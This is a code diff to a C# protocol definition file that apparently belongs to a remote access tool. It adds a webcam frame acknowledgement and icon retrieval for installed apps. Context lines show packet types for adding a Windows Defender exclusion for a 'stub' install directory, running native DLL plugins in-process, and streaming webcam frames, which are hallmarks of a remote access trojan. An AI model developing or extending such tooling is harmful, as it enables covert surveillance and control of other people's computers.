@@ -40,6 +40,7 @@ public enum PacketType
     WcamStop = 61,       // bidirectional
     WcamFrame = 62,      // client→server: {Fn, W, H, J}
     WcamDevices = 63,    // client→server: {Devices:[...]}
+    WcamFrameAck = 64,   // server→client: ready for next frame
 
     DefenderExclude = 70, // server→client: add WMI exclusion for stub install dir (no payload)
     PluginExec = 71,      // server→client: load + run a native DLL plugin in-process
@@ -129,6 +130,8 @@ public enum PacketType
     InstalledGetList    = 230,  // server→client: request list
     InstalledListResult = 231,  // client→server: list of apps
     InstalledUninstall  = 232,  // server→client: {UninstallString}
+    InstalledGetIcon    = 233,  // server→client: request icon {Name}
+    InstalledIconResult = 234,  // client→server: {Name, IconB64}
 
     // Service Manager
     SvcGetList    = 240,  // server→client: request services
@@ -576,6 +579,8 @@ public class InstalledApp
 }
 public class InstalledListResultData { public List<InstalledApp> Apps { get; set; } = []; }
 public class InstalledUninstallData  { public string UninstallString { get; set; } = string.Empty; }
+public class InstalledIconRequestData { public string Name { get; set; } = string.Empty; }
+public class InstalledIconResultData  { public string Name { get; set; } = string.Empty; public string IconB64 { get; set; } = string.Empty; }
 
 // ── Service Manager ───────────────────────────────────
 public class ServiceEntry
